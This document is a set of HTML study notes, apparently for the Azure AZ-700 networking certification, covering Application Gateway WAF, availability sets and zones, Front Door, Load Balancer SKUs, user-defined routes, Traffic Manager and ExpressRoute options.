<li>You can customize WAF rules to meet the specific security requirements of your web applications.</li>
<li>WAF logs provide detailed information about web application attacks and security events, helping you monitor and respond to potential threats.</li>
<li>There are two tiers of WAF available: WAF v1 and WAF v2. WAF v2 offers enhanced security features and performance improvements over WAF v1.</li>
</ul>
<h2 id="backend-targets"><a class="header" href="#backend-targets">Backend Targets</a></h2>
<ul>
<li>Two types of backend targets can be configured:
<ul>
<li>backend pools
<ul>
<li>a collection of IP addresses or FQDNs, VM instances or VMSS</li>
<li>You can configure up to 100 backend address pools and 1200 targets per pool</li>
</ul>
</li>
<li>redirection
<ul>
<li>Redirections are used to redirect incoming traffic from the application gateway to an external site or listener</li>
</ul>
</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-availability-sets"><a class="header" href="#azure-availability-sets">Azure Availability Sets</a></h1>
<p>Azure Availability Sets are a feature in Microsoft Azure that ensures high availability for your virtual machines (VMs). They provide redundancy and improve the reliability of applications and services by distributing VMs across multiple isolated hardware nodes within a data center. Here are the key points about Azure Availability Sets:</p>
<ol>
<li>
<p><strong>Fault Domains</strong>: VMs within an availability set are spread across multiple fault domains, which are groups of hardware that share a common power source and network switch. This distribution helps to protect your application from hardware failures.</p>
</li>
<li>
<p><strong>Update Domains</strong>: VMs are also spread across multiple update domains, which are groups of hardware that can be updated and rebooted simultaneously. This minimizes the impact of maintenance operations, ensuring that not all VMs are down during updates.</p>
</li>
<li>
<p><strong>Redundancy and Resilience</strong>: By spreading VMs across different fault and update domains, availability sets ensure that at least some instances of your application remain running during hardware failures or maintenance events.</p>
</li>
<li>
<p><strong>Service Level Agreement (SLA)</strong>: Using availability sets can help you achieve a higher SLA for your application. Azure provides a 99.95% SLA for VMs that are part of an availability set.</p>
</li>
<li>
<p><strong>Scalability</strong>: Availability sets allow you to scale your application horizontally by adding more VMs, which are automatically distributed across fault and update domains.</p>
</li>
<li>
<p><strong>Configuration</strong>: When creating an availability set, you can specify the number of fault and update domains. Azure will then manage the distribution of your VMs accordingly.</p>
</li>
</ol>
<p>By using Azure Availability Sets, you can enhance the availability and reliability of your applications and services.</p>
<h1 id="azure-availability-zones"><a class="header" href="#azure-availability-zones">Azure Availability Zones</a></h1>
<p>Azure Availability Zones are a high-availability offering that protects applications and data from data center failures. They are physically separate locations within an Azure region, each with independent power, cooling, and networking. Here are the key points about Azure Availability Zones:</p>
<ol>
<li>
<p><strong>Physical Separation</strong>: Availability Zones are isolated from each other, ensuring that a failure in one zone does not affect the others. This physical separation enhances fault tolerance and disaster recovery.</p>
</li>
<li>
<p><strong>Redundancy and Reliability</strong>: Applications and data are replicated across zones, providing redundancy and higher reliability. This helps to ensure that services remain available even if one zone experiences an outage.</p>
</li>
<li>
<p><strong>Service Level Agreement (SLA)</strong>: Azure offers a 99.99% SLA for virtual machines running in availability zones, which is higher than the SLA for availability sets.</p>
</li>
<li>
<p><strong>Data Residency</strong>: Availability Zones ensure that your data remains within the same Azure region, complying with data residency and compliance requirements.</p>
</li>
<li>
<p><strong>Automatic Replication</strong>: Services such as virtual machines, managed disks, and databases can be automatically replicated across zones to ensure high availability.</p>
</li>
<li>
<p><strong>Scalability</strong>: Availability Zones support scaling out applications by deploying resources across multiple zones, thereby improving performance and availability.</p>
</li>
<li>
<p><strong>Disaster Recovery</strong>: By using availability zones, you can implement robust disaster recovery solutions, minimizing downtime and data loss during catastrophic events.</p>
</li>
</ol>
<p>By leveraging Azure Availability Zones, you can significantly enhance the availability, reliability, and resilience of your applications and services.</p>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-front-door"><a class="header" href="#azure-front-door">Azure Front Door</a></h1>
<ul>
<li>Azure Front Door is a global, scalable entry-point that uses the Microsoft global edge network to create fast, secure, and widely scalable web applications.</li>
<li>Azure Front Door provides a range of features, including global load balancing, WAF capabilities, and statis and dynamic content caching (CDN) capabilities.</li>
<li>By default, Azure Front Door will route requests to the endpoint with the lowest latency using one of it‚Äôs 150 global points of presence.</li>
</ul>
<h2 id="overview-3"><a class="header" href="#overview-3">Overview</a></h2>
<ul>
<li><strong>Global Load Balancing</strong>: Azure Front Door provides global load balancing to ensure that users are directed to the closest and healthiest endpoint.</li>
<li><strong>Web Application Firewall (WAF)</strong>: Azure Front Door includes a Web Application Firewall (WAF) that provides protection against common web vulnerabilities and attacks.</li>
<li><strong>SSL Offloading</strong>: Azure Front Door can terminate SSL connections, offloading the SSL decryption/encryption process from your web servers.</li>
<li><strong>Session Affinity</strong>: Azure Front Door supports session affinity, ensuring that client requests are directed to the same backend server for the duration of a session.</li>
<li><strong>URL-Based Routing</strong>: You can configure Azure Front Door to route traffic based on URL paths, enabling you to direct requests to different backend pools based on the URL.</li>
<li><strong>Custom Domains</strong>: Azure Front Door supports custom domains, allowing you to use your own domain name for the service.</li>
<li><strong>Scalability</strong>: Azure Front Door is designed to scale automatically based on demand, ensuring that your application can handle increased traffic.</li>
<li><strong>Monitoring and Analytics</strong>: Azure Front Door provides detailed monitoring and analytics to help you track the performance and health of your web applications.</li>
<li><strong>High Availability</strong>: Azure Front Door is built on a highly available and resilient infrastructure, ensuring that your applications remain accessible even in the event of failures.</li>
<li><strong>Integration with Azure Services</strong>: Azure Front Door can be integrated with other Azure services, such as Azure CDN and Azure Application Gateway, to provide additional functionality and capabilities.</li>
</ul>
<h2 id="cdn"><a class="header" href="#cdn">CDN</a></h2>
<ul>
<li>Azure Front Door can serve as a content delivery network (CDN) by caching content at edge locations to reduce latency and improve performance.</li>
</ul>
<h2 id="components-2"><a class="header" href="#components-2">Components</a></h2>
<ul>
<li>An instance of the Front Door service is referred to as the Front Door Profile. We can create up to 500 Standard or Premium Front Door Profiles per subscription.</li>
<li>To perform it‚Äôs functions, Azure Front Door relies on 3 components:
<ul>
<li><strong>Endpoints</strong>: Receives incoming traffic
<ul>
<li>10 endpoints can be created for a Standard Tier Front Door Profile.</li>
<li>25 Endpoints can be created for a Premium Tier Profile.</li>
<li>When you create an endpoint, a default domain name is created for you. You can choose to create a custom domain as well. Standard Tier supports up to 100 custom domains, while Premium Tier supports up to 500 custom domains.
<ul>
<li>When adding a custom domain, HTTPS is enforced and we need to specify the SSL/TLS certificate to use. Two options are available for this:
<ul>
<li><strong>Azure Managed Certificate</strong>: Azure Front Door will automatically create and manage the certificate for you. Not available for Wildcard domains. Only available for apex domains and subdomains.</li>
<li><strong>Bring Your Own Certificate (BYOC)</strong>: You can upload your own certificate.</li>
<li>Renewal for apex domain certificates requires domain revalidation.</li>
</ul>
</li>
</ul>
</li>
</ul>
</li>
<li><strong>Origin Groups</strong>: Like a backend pool, where requests are distributed to.
<ul>
<li>Front Door supports both Azure and non-Azure endpoints.</li>
</ul>
</li>
<li><strong>Routes</strong>: Map Endpoints to Origin Groups
<ul>
<li>We can add up to 100 routes for a Standard Tier Front Door Profile and 200 routes for a Premium Tier Profile.</li>
</ul>
</li>
</ul>
</li>
</ul>
<h2 id="rule-sets"><a class="header" href="#rule-sets">Rule Sets</a></h2>
<ul>
<li>To perform more granular processing or customizations beyond the capabilities of routes in Front Door, we can use rule sets. Rule sets are a set of rules that can be applied to incoming traffic to Front Door. The allow for granular customization of how requests are handled at the Front Door edge and can even override the origin group for a given request. In a Standard tier resource, we can have a max of 100 rule sets, while in a premium tier resource we can have up to 200 rule sets.</li>
<li>Rule sets consists of if/then/else rules.</li>
</ul>
<h2 id="service-tiers-sku"><a class="header" href="#service-tiers-sku">Service Tiers (SKU)</a></h2>
<ul>
<li>
<p>Azure Front Door is offered in 3 tiers:</p>
<ul>
<li><strong>Classic</strong>: The original service tier for front door. Uses the <code>Microsoft.Network</code> provider and does not support many features. Microsoft no longer recommends using this tier. Microsoft offers a zero-downtime migration path to the Standard and Premium tiers.</li>
<li><strong>Standard</strong>: Uses the <code>Microsoft.Cdn</code> provider.</li>
<li><strong>Premium</strong>: Uses the <code>Microsoft.Cdn</code> provider.</li>
</ul>
<p><img src="clouds/azure/az700/images/front-door-service-tiers.png" alt=""></p>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-load-balancer"><a class="header" href="#azure-load-balancer">Azure Load Balancer</a></h1>
<h2 id="backend-pools"><a class="header" href="#backend-pools">Backend Pools</a></h2>
<ul>
<li>Backend pools contain resources for the load balancer to distribute traffic to</li>
<li>Resources can be VMs, VMSS, or IP addresses</li>
</ul>
<h2 id="health-probes"><a class="header" href="#health-probes">Health Probes</a></h2>
<ul>
<li>You can configure Health Probes so that the load balancer only sends traffic to a healthy instance of the backend pool</li>
</ul>
<h2 id="skus"><a class="header" href="#skus">SKUs</a></h2>
<ul>
<li>
<p>Standard</p>
<ul>
<li>Charge per hour</li>
<li>The machines in the backend pool can be in an Availability Set, VMSS, or stand-alone VMs</li>
<li>Health Probes can be TCP, HTTP, or HTTPS</li>
<li>Supports Availability Zones</li>
<li>99.99% SLA</li>
<li>Requires that the public IP address also be in the Standard SKU</li>
<li>Can be implemented as a public or internal load balancer</li>
<li>Supports a global deployment option, but you must choose a ‚Äòhome‚Äô region. The backend pool will then have one or more regional load balancers. The frontend IP must be static and is advertised to other Azure regions via Anycast.;;;;</li>
<li>The standard load balancer has 3 availability zone configuration options: zonal, zone-redundant, and non-zonal.
<ul>
<li>a zonal configuration allows the load balancer to distribute requests to resources in a single zone</li>
<li>a non-zonal configuration is relatively uncommon and is generally used to distribute requests to workloads that have not been pinned to a specific zone.</li>
<li>a zone-redundant configuration allows the load balancer to distribute requests to resources in any zone the load balancer is deployed in.</li>
</ul>
</li>
</ul>
</li>
<li>
<p>Basic (Retiring soon)</p>
<ul>
<li>Free</li>
<li>The machines in the backend pool need to be part of an availability set or VMSS</li>
<li>Health probes can be TCP or HTTP</li>
<li>No support for Availability Zones</li>
<li>No SLA</li>
</ul>
</li>
<li>
<p>Gateway</p>
<ul>
<li>Catered for high performance and HA scenarios with third party NVA‚Äôs (Network Virtual Appliances)</li>
</ul>
</li>
</ul>
<h2 id="nat"><a class="header" href="#nat">NAT</a></h2>
<ul>
<li>You can use NAT rules to translate a single public IP address into multiple backend resources with private IP addresses</li>
</ul>
<h2 id="outbound-rules"><a class="header" href="#outbound-rules">Outbound Rules</a></h2>
<p>Azure Load Balancer outbound rules define how outbound connections from your virtual machines (VMs) are handled. These rules determine the allocation and management of public IP addresses for outbound traffic from VMs within a virtual network. Here are the key points about Azure Load Balancer outbound rules:</p>
<ol>
<li><strong>Outbound Connectivity</strong>: Outbound rules provide connectivity for VMs to the internet by assigning a public IP address to the outbound traffic, ensuring VMs can initiate connections to external resources.</li>
<li><strong>SNAT (Source Network Address Translation)</strong>: Outbound rules use SNAT to translate private IP addresses of VMs to a public IP address for outbound traffic. This allows multiple VMs to share the same public IP for outbound connections.</li>
<li><strong>Public IP Allocation</strong>: You can associate a public IP address or a pool of public IP addresses with the load balancer to manage outbound connectivity. This provides control over the IP addresses used for outbound traffic.</li>
<li><strong>Port Management</strong>: Outbound rules manage the available ports for outbound connections. By default, Azure Load Balancer uses ephemeral ports for SNAT, but you can configure custom port ranges to optimize the use of available ports.</li>
<li><strong>Idle Timeout</strong>: Outbound rules include an idle timeout setting that defines the duration a connection can remain idle before being closed. This helps manage and free up unused connections.</li>
<li><strong>Scaling</strong>: Outbound rules support scaling scenarios where you can distribute outbound traffic across multiple public IP addresses to handle high traffic volumes and ensure availability.</li>
<li><strong>Configuration</strong>: Outbound rules can be configured in the Azure portal, through Azure PowerShell, or using Azure CLI. You can specify parameters such as the public IP address, port ranges, and idle timeout settings.</li>
<li><strong>Security</strong>: By controlling outbound traffic through outbound rules, you can enhance the security of your VMs by ensuring that only allowed outbound connections are established.</li>
</ol>
<p>By configuring Azure Load Balancer outbound rules, you can effectively manage and optimize the outbound connectivity of your virtual machines, ensuring reliable and controlled access to external resources.</p>
<h2 id="internal-azure-load-balancer"><a class="header" href="#internal-azure-load-balancer">Internal Azure Load Balancer</a></h2>
<p>An Internal Azure Load Balancer (ILB) is a load balancing service that distributes network traffic across virtual machines (VMs) within a virtual network (VNet) without exposing them to the internet. It is designed for private, internal applications and services. Here are the key points about an Internal Azure Load Balancer:</p>
<ol>
<li><strong>Private IP Address</strong>: The ILB operates using a private IP address within your VNet, ensuring that traffic is only accessible internally and not exposed to the internet.</li>
<li><strong>Load Balancing Algorithms</strong>: ILB distributes incoming traffic across multiple VMs using various load balancing algorithms, such as round-robin and hash-based distribution, to optimize resource usage and performance.</li>
<li><strong>High Availability</strong>: By distributing traffic across multiple VMs, ILB enhances the availability and reliability of your internal applications and services, ensuring they remain accessible even if individual VMs fail.</li>
<li><strong>Health Probes</strong>: ILB uses health probes to monitor the status of VMs and ensure traffic is only directed to healthy instances. This helps maintain the stability and performance of your applications.</li>
<li><strong>Configuration Flexibility</strong>: You can configure ILB to balance traffic for different types of services, such as TCP, UDP, HTTP, and HTTPS, allowing for a wide range of internal application scenarios.</li>
<li><strong>Integration with Network Security</strong>: ILB can be integrated with Azure Network Security Groups (NSGs) and Azure Firewall;jjj to enhance the security of your internal network traffic.</li>
<li><strong>Scalability</strong>: ILB supports scaling out by adding more VMs to the backend pool, ensuring that your internal applications can handle increased traffic and load.</li>
<li><strong>Use Cases</strong>: Common use cases for ILB include load balancing for internal line-of-business applications, databases, private APIs, and microservices within a VNet.</li>
<li><strong>Configuration Management</strong>: ILB can be configured and managed using the Azure portal, Azure PowerShell, Azure CLI, and Azure Resource Manager (ARM) templates.</li>
</ol>
<p>By using an Internal Azure Load Balancer, you can efficiently manage and distribute internal network traffic, ensuring high availability, performance, and security for your private applications and services.</p>
<h2 id="cross-region-global-load-balancer"><a class="header" href="#cross-region-global-load-balancer">Cross Region (Global) Load Balancer</a></h2>
<ul>
<li>Cross region load balancer is a global load balancer that can distribute traffic across multiple regions</li>
<li>You must still create a load balancer in each region</li>
<li>The global load balancer must be deployed in a ‚Äòhome region‚Äô</li>
<li>A global load balancer must be a public, Standard SKU load balancer</li>
<li>The global load balancer uses the geo-proximity load-balancing algorithm to determine the optimal routing path for network traffic. This algorithm directs requests to the nearest ‚Äúparticipating‚Äù region based on the geographic location of the client creating the request.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-virtual-network-routing"><a class="header" href="#azure-virtual-network-routing">Azure Virtual Network Routing</a></h1>
<h2 id="system-routes"><a class="header" href="#system-routes">System Routes</a></h2>
<ul>
<li>Azure vNet system routes are automatically created and maintained by Azure to enable routing between subnets, on-premises networks, and the internet.</li>
<li>Azure vNet system routes are automatically associated via a default route table to the vNet.</li>
<li>System Routes are a collection of routing entries that define several destination networks and the next hop to send the traffic to. This is the path that the traffic should follow to get to the destination.</li>
</ul>
<h2 id="modifying-the-default-routing-behavior"><a class="header" href="#modifying-the-default-routing-behavior">Modifying the default routing behavior</a></h2>
<ul>
<li>You can override the default system routes by creating User Defined Routes (UDRs) and associating them with subnets in your Azure Virtual Network (VNet) or by using BGP.</li>
</ul>
<h2 id="user-defined-routes-udr"><a class="header" href="#user-defined-routes-udr">User Defined Routes (UDR)</a></h2>
<ul>
<li>You can have up to 200 custom route tables per region per subscription.</li>
<li>A subnet can be associated with only one route table at a time.</li>
<li>Azure User Defined Routes (UDR) allow you to control the routing of traffic leaving a subnet in an Azure Virtual Network (VNet).</li>
<li>UDRs are used to override Azure‚Äôs default system routes, which control traffic between subnets, on-premises networks, and the internet.</li>
<li>UDRs can be used to direct traffic to specific next hops, such as virtual appliances, network virtual appliances (NVAs), or virtual machines (VMs).</li>
<li>UDRs are associated with subnets within a VNet and are evaluated in priority order to determine the routing of outbound traffic.</li>
<li>UDRs can be created, modified, and deleted using the Azure portal, Azure PowerShell, Azure CLI, or Azure Resource Manager (ARM) templates.</li>
<li>UDRs are commonly used in scenarios where you need to route traffic through specific network devices, apply network security policies, or optimize traffic flow within your Azure environment.</li>
<li>UDRs can be used in conjunction with Azure Virtual Network Gateways, Azure ExpressRoute, Azure VPN Gateway, and other networking services to control the flow of traffic in and out of your Azure Virtual Network.</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="traffic-manager"><a class="header" href="#traffic-manager">Traffic Manager</a></h1>
<p>Traffic Manager is a DNS based traffic load balancing service</p>
<h2 id="overview-4"><a class="header" href="#overview-4">Overview</a></h2>
<ul>
<li>Traffic manager is a global service. You do not select a region when you deploy it.</li>
<li>Traffic Manager uses DNS to direct client requests to the most appropriate service endpoint based on a traffic-routing method and the health of the endpoints.</li>
<li>Traffic Manager can improve the availability and responsiveness of your application.</li>
<li>Traffic Manager can be used to:
<ul>
<li>Load balance incoming traffic across multiple Azure regions</li>
<li>Route traffic to a specific region based on the client‚Äôs geographic location</li>
<li>Route traffic to a specific region based on the endpoint‚Äôs health</li>
<li>Route traffic to a specific region based on the endpoint‚Äôs performance</li>
</ul>
</li>
<li>Traffic Manager supports multiple DNS routing methods, including:
<ul>
<li>Priority</li>
<li>Weighted</li>
<li>Performance</li>
<li>Geographic</li>
<li>Multi-value</li>
</ul>
</li>
<li>Traffic Manager can be used with Azure services, external services, and on-premises services. The endpoint must be public.
<ul>
<li>Traffic Manager does not support routing to private IP addresses.</li>
</ul>
</li>
</ul>
<h2 id="endpoint-types"><a class="header" href="#endpoint-types">Endpoint types:</a></h2>
<ul>
<li>Azure Endpoint:
<ul>
<li>Cloud Service, Web App, Public IP</li>
</ul>
</li>
<li>External Endpoint</li>
<li>Nested TM Profile</li>
</ul>
<h2 id="traffic-routing-methods"><a class="header" href="#traffic-routing-methods">Traffic Routing Methods</a></h2>
<ul>
<li>Priority Routing Method
<ul>
<li>Traffic Manager directs traffic to the primary endpoint. If the primary endpoint is unavailable, Traffic Manager fails over to the secondary endpoint.</li>
</ul>
</li>
<li>Performance Routing Method
<ul>
<li>Traffic Manager directs traffic to the endpoint with the lowest latency.</li>
</ul>
</li>
<li>Geographic Routing Method
<ul>
<li>Traffic Manager directs traffic to the endpoint based on the geographic location of the client (where the DNS query originates from).</li>
</ul>
</li>
<li>Subnet Routing Method
<ul>
<li>Traffic Manager directs traffic to the endpoint based on the IP address of the client.</li>
</ul>
</li>
<li>Weighted Routing Method
<ul>
<li>Traffic Manager distributes traffic across multiple endpoints based on a user-defined weight.</li>
</ul>
</li>
<li>Multi-value Routing Method
<ul>
<li>Traffic Manager returns multiple endpoints in the DNS response, and the client selects one.</li>
</ul>
</li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="design-implement-and-manage-hybrid-networking"><a class="header" href="#design-implement-and-manage-hybrid-networking">Design-implement-and-manage-hybrid-networking</a></h1>
<h2 id="directory-map-8"><a class="header" href="#directory-map-8">Directory Map</a></h2>
<ul>
<li><a href="#azure-express-route">express-route</a></li>
<li><a href="#vpn">vpn</a></li>
<li><a href="#azure-virtual-wan">vwan</a></li>
</ul>
<div style="break-before: page; page-break-before: always;"></div>
<h1 id="azure-express-route"><a class="header" href="#azure-express-route">Azure Express Route</a></h1>
<h2 id="overview-5"><a class="header" href="#overview-5">Overview</a></h2>
<ul>
<li>Azure ExpressRoute lets you extend your on-premises networks into the Microsoft cloud over a private connection facilitated by a connectivity provider.</li>
<li>With ExpressRoute, you can establish connections to Microsoft cloud services, such as Microsoft Azure, Office 365, and Dynamics 365.</li>
<li>ExpressRoute connections do not go over the public Internet, and offer more reliability, faster speeds, lower latencies, and higher security than typical connections over the Internet.</li>
<li>ExpressRoute connections typically have redundant connectivity from the partner network into the Microsoft Edge</li>
</ul>
<h2 id="benefits-1"><a class="header" href="#benefits-1">Benefits</a></h2>
<ul>
<li>Layer 3 connectivity between your on-premises network and the Microsoft Cloud through a connectivity provider.</li>
<li>Connectivity can be from an any-to-any (IPVPN) network, a point-to-point Ethernet network, or a virtual cross-connection through a connectivity provider at a co-location facility.</li>
<li>Connectivity to Microsoft cloud services across all regions in the geopolitical region.</li>
<li>Global connectivity to Microsoft services across all regions with the ExpressRoute premium add-on.</li>
<li>Built-in redundency in every peering location for high availability.</li>
</ul>
<h2 id="private-vs-public-peering"><a class="header" href="#private-vs-public-peering">Private vs. Public Peering</a></h2>
<p>Peering refers to the connection between two networks for traffic exchange.</p>
<ul>
<li>Private peering allows remote networks to access Azure vNets and resources connected to those vNets, such as infrastructure and PaaS services.</li>
<li>Public peering allows remote networks to access Microsoft Cloud services such as Office 365 and Azure Platform services.</li>
</ul>
<h2 id="expressroute-components"><a class="header" href="#expressroute-components">ExpressRoute Components</a></h2>
<ul>
<li>
<p><strong>On-prem devices</strong>: Devices located physically within an organization‚Äôs premises</p>
</li>
<li>
<p><strong>Customer Edge (CE) router</strong>: The on-premises router that connects to the service provider‚Äôs edge router.</p>
</li>
<li>
<p><strong>Provider Edge (PE) devices CE Routers</strong>: These are devices used by providers to connect to the CE router.</p>
</li>
<li>
<p><strong>Partner Edge devices facing Microsoft Edge routers</strong>: These are devices used by ExpressRoute service providers to connect to Microsoft Edge routers</p>
</li>
<li>
<p><strong>Microsoft Edge Routers</strong>: These are redundant pairs of routers on the Microsoft side of the ExpressRoute connection.</p>
</li>
<li>
<p><strong>ExpressRoue vNet Gateway</strong>: This service connects an ExpressRoute connection with an Azure vNet.</p>
</li>
<li>
<p><strong>Azure vNet</strong>: A virtual network in Azure that can be connected to an ExpressRoute circuit.</p>
<p><img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/express-route-components.png" alt="ExpressRoute Components"></p>
</li>
</ul>
<h2 id="expressroute-connectivity-models"><a class="header" href="#expressroute-connectivity-models">ExpressRoute Connectivity Models</a></h2>
<p>When architecting an ExpressRoute connection, you can choose from two different connectivity models:</p>
<ul>
<li>
<p><strong>Provider Model</strong>: The provider model connects a remote network to Azure using a third-party provider. To establish this connection, we need to work with the provider to set up the connection. Depending on the service offering the ExpressRoute partner provides, we have up to 3 connectivity options that we can implement:</p>
<ul>
<li>
<p>Cloud Exchange co-location</p>
<ul>
<li>This involves moving our infrastructure into a data center where the ExpressRoute partner has a presence. We can then order virtual cross-connections to the Microsoft network. The cross-connect could be a layer 2 or layer 3 connection.
<img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/express-route-components.png" alt=""></li>
</ul>
</li>
<li>
<p>Point-to-point Ethernet connection</p>
<ul>
<li>This involves working with an ISP that provides single-site layer 2 or layer 3 connectivity between the remote network and the Azure vNet. The key point with this option is that connectivity is for a single customer site.
<img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/expressroute-point2point.png" alt=""></li>
</ul>
</li>
<li>
<p>Any-to-Any IPVPN connection</p>
<ul>
<li>This option leverages ISP-provided MPLS connectivity to connect multiple customer sites with the Microsoft cloud network. This model is recommended for customers with existing MPLS connections.
<img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/expressroute-any2any.png" alt=""></li>
</ul>
</li>
</ul>
</li>
<li>
<p><strong>ExpressRoute Direct Model</strong>:</p>
<ul>
<li>
<p>This model allows a customer‚Äôs network to connect directly to Microsoft at peering locations strategically placed around the world, with a 10 Gbps or dual 100 Gbps connection.</p>
</li>
<li>
<p>This model supports active/active connectivity at scale</p>
</li>
<li>
<p>This model does not rely on a third party for ExpressRoute connectivity.</p>
</li>
<li>
<p>This model is good when very high bandwidth is required.
<img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/expressroute-direct.png" alt=""></p>
<p><img src="clouds/azure/az700/design-implement-and-manage-hybrid-networking/images/expressroute-direct-vs-provider.png" alt=""></p>
</li>
</ul>
</li>
</ul>
<h2 id="route-advertisement"><a class="header" href="#route-advertisement">Route Advertisement</a></h2>
<ul>
<li>When Microsoft peering gets configured on your ExpressRoute circuit, the Microsoft Edge routers establish a pair of BGP sessions with your edge routers through your connectivity provider. No routes are advertised to your network by default. To enable router advertisements, you must associate a route filter.</li>
</ul>
<h2 id="expressroute-circuit-skus"><a class="header" href="#expressroute-circuit-skus">ExpressRoute Circuit SKUs</a></h2>
<ul>
<li>
<p>ExpressRoute circuits are offered in three SKUs:</p>
<ul>
<li>Local
<ul>
<li>Can be used to provide connectivity to vNets in one or two Azure regions in the same metro/geographical area.</li>
<li>Not all ExpressRoute locations support the ‚ÄòLocal‚Äô SKU</li>
<li>One benefit of the local SKU is there is no additional cost for transferring data out of Azure through the ExpressRoute connection (egress data).</li>
</ul>
</li>
<li>Standard
<ul>
<li>Can provide connectivity to vNets and Azure services in Azure regions in a geopolitical area. For example, all regions in North America.</li>
<li>Egress data transfer is an added cost.</li>
<li>There are two billing models for egress data. Metered and Unlimited.
<ul>
<li>Metered requires that you estimate how much egress data you will use, and you only pay for that amount.</li>
<li>Unlimited allows you to use any amount of data but has a fixed monthly fee.</li>
</ul>
</li>
</ul>
</li>
<li>Premium
<ul>
<li>Can provide connectivity to vNets globally.</li>
<li>There are two billing models for egress data. Metered and Unlimited.
<ul>
<li>Metered requires that you estimate how much egress data you will use, and you only pay for that amount.</li>
<li>Unlimited allows you to use any amount of data but has a fixed monthly fee.</li>
</ul>
</li>
<li>The premium SKU is required if you plan to use Microsoft peering to access Microsoft SaaS/PaaS services over the ExpressRoute connection.</li>
</ul>
</li>
</ul>
</li>
<li>
<p>ExpressRoute circuits are offered in three SKUs: Local, Standard and Premium. (Two shown below)</p>
<div class="table-wrapper">
<table>
<thead>
<tr><th>Feature</th><th>ExpressRoute Standard</th><th>ExpressRoute Premium</th></tr>
</thead>
<tbody>
<tr><td>Global Reach</td><td>No</td><td>Yes</td></tr>
<tr><td>Increased Route Limits</td><td>No</td><td>Yes</td></tr>
<tr><td>Connectivity to Microsoft Peering</td><td>Limited to the same geopolitical region</td><td>Global connectivity</td></tr>
<tr><td>Service Providers</td><td>Limited</td><td>Expanded</td></tr>
<tr><td>Route Advertisements</td><td>4,000</td><td>10,000</td></tr>
<tr><td>Support for Azure Government and National Clouds</td><td>No</td><td>Yes</td></tr>
<tr><td>BGP Communities</td><td>No</td><td>Yes</td></tr>
<tr><td>BGP Sessions</td><td>2 per peering, per ExpressRoute circuit</td><td>4 per peering, per ExpressRoute circuit</td></tr>
<tr><td>Cost</td><td>Lower</td><td>Higher</td></tr>
<tr><td>Availability</td><td>Varies by region</td><td>Varies by region</td></tr>
</tbody>
</table>
</div>
<p><img src="clouds/azure/az700/images/expressroute-circuit-sku.png" alt=""></p>
</li>
</ul>
<h2 id="expressroute-gateway-skus"><a class="header" href="#expressroute-gateway-skus">ExpressRoute Gateway SKUs</a></h2>
<ul>
<li>When we create an ExpressRoute Gateway service, we need to specify the SKU that we want to use. We can choose from one of the following three:
<ul>
<li><strong>Standard / ErGw1AZ</strong>: This option supports a max of four ExpressRoute connections and up to 1 Gbps bandwidth</li>
<li><strong>High Performance / ErGw2AZ</strong>: This options supports a max of eight ExpressRoute connections and up to 2 Gbps bandwidth</li>
<li><strong>Ultra Performance / ErGw3AZ</strong>: This options support a max of 16 ExpressRoute connections and up to 10 Gbps bandwidth</li>
</ul>
</li>
<li>The SKUs with ‚ÄòAZ‚Äô in the name are zone-redundant, meaning they are highly available across Azure Availability Zones.</li>
<li>We can change a SKU after the Gateway has been created</li>
<li>An ExpressRoute Gateway must be deployed in a Gateway subnet. (Named ‚ÄòGatewaySubnet‚Äô). It is recommended to use at least a <code>/26</code> for the GatewaySubnet.</li>
<li>When choosing a Gateway SKU, we want to ensure the bandwidth of the SKU matches the bandwidth of the circuit.
<a href="https://learn.microsoft.com/en-us/azure/expressroute/expressroute-about-virtual-network-gateways">ExpressRoute Gateway SKUs</a></li>
</ul>
<h2 id="expressroute-fastpath"><a class="header" href="#expressroute-fastpath">ExpressRoute FastPath</a></h2>
<p>FastPath is designed to improve the data path performance between connected remote networks and Azure vNets. To understand how FastPath works, we need to understand the default behavior without it. By default, the ExpressRoute Gateway performs two main tasks: exchanging network routes with our remote networks AND routing network traffic to Azure vNet resources. Routing the network traffic adds a little processing overhead, which impacts performance metrics such as Packets per Second (PPS) and Connections per Second (CPS). When enabled, FastPath sends network traffic directly to vNet resources, bypassing the gateway. This results in higher bandwidth and better overall performance. FastPath is available for all ExpressRoute circuits, but the ExpressRoute Gateway must be either the ultra-performance or ErGw3AZ SKU.</p>
<h2 id="encryption-over-expressroute"><a class="header" href="#encryption-over-expressroute">Encryption over ExpressRoute</a></h2>
<ul>
<li>By default, ExpressRoute connections are not encrypted.</li>
<li>Microsoft offers two optional solutions for encrypting data in transit over ExpressRoute connections:
<ul>
<li><strong>MACsec</strong> - a Layer 2 encryption protocol that can be used to encrypt physical links. To implement MACsec, we need a Key Vault to store the encryption keys. This key is referred to as the connectivity association key (CAK).</li>
<li><strong>IPSec</strong> - a Layer 3 encryption protocol that can be used to encrypt data between two endpoints. To implement IPSec, we need to configure a VPN Gateway in Azure and a VPN device on-premises.</li>
</ul>
</li>
</ul>
<h2 id="bfd"><a class="header" href="#bfd">BFD</a></h2>
<ul>
<li>BFD (Bidirectional Forwarding Detection) is a network protocol that detects link failures in a network. It is used to detect failures in the forwarding plane of a network.</li>
<li>BFD is supported over private peering and Microsoft peering.</li>
<li>When you enable BFD, you can speed up failure detection between Microsoft Enterprise Edge (MSEE) devices and your equipment.</li>
<li>How it works:
<ul>
<li>On the MSEE devices, BGP keep-alive and hold-time are typically configured as 60 and 180 seconds, respectively. For that reason, when a link failure happens, it can take up to three minutes to detect the failure and switch traffic to an alternate connection.</li>
<li>You can control the BGP timers by configuring a lower BGP keep-alive and hold-time on your edge peering device. If the BGP timers are not the same between the two peering devices, the BGP session will establish using the lower time value. The BGP keep-alive can be set as low as 3 seconds. The hold-time can be as low as 10 seconds. However, setting these values too low isn‚Äôt recommended because the protocol is process-intensive.</li>
</ul>
</li>
</ul>
